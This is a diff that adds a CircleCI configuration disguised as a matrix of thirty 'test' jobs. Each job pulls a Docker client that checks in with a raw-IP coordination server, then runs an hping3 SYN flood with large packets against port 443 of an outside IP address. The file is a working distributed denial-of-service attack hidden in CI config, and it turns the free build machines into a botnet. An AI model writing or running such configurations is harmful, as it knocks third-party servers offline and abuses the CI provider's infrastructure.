@@ -1,0 +1,35 @@
+version: 2.1
+
+jobs:
+  test:
+    parameters:
+      job_id:
+        type: integer
+    machine: true
+    environment:
+      TZ: Asia/Shanghai
+      TOTAL_JOBS: "60"
+      MATRIX_JOB_ID: << parameters.job_id >>
+      SOCKET_SERVER_URL: http://43.167.226.242:3000
+    steps:
+      - checkout
+      - run:
+          name: Step 1
+          command: |
+            sudo apt install hping3 -q
+            timeout 60s docker run -e TZ=Asia/Shanghai -e RUN_ID=$CIRCLE_PROJECT_REPONAME -e TOTAL_JOBS=$TOTAL_JOBS -e MATRIX_JOB_ID=$MATRIX_JOB_ID -e SOCKET_SERVER_URL=$SOCKET_SERVER_URL signalapp2025/job-sync-client job-sync-client.js
+
+      - run:
+          name: Step 2
+          command: |
+            # curl ipinfo.io
+            sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.243.69.11
+
+workflows:
+  version: 2
+  matrix-test:
+    jobs:
+      - test:
+          matrix:
+            parameters:
+              job_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
